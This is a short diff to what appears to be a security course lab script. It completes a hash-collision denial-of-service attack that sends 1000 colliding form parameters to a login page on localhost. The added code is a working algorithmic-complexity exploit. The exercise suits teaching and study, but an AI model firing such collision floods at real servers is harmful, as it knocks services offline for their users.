@@ -1,6 +1,8 @@
 from requests import codes, Session
+from collisions import find_collisions
 
 LOGIN_FORM_URL = "http://localhost:8080/login"
+COLLISION_LENGTH = 1000
 
 #This function will send the login form
 #with the colliding parameters you specify.
@@ -18,10 +20,12 @@ def do_login_form(sess, username,password,params=None):
 def do_attack():
 	sess = Session()
   #Choose any valid username and password
-	uname =""
-	pw = ""
+	uname ="victim"
+	pw = "victim"
   #Put your colliding inputs in this dictionary as parameters.
-	attack_dict = {}
+	key = b'\x00'*16
+	colls = find_collisions(key, COLLISION_LENGTH)
+	attack_dict = {coll:1 for coll in colls}
 	response = do_login_form(sess, uname,pw,attack_dict)
 
 
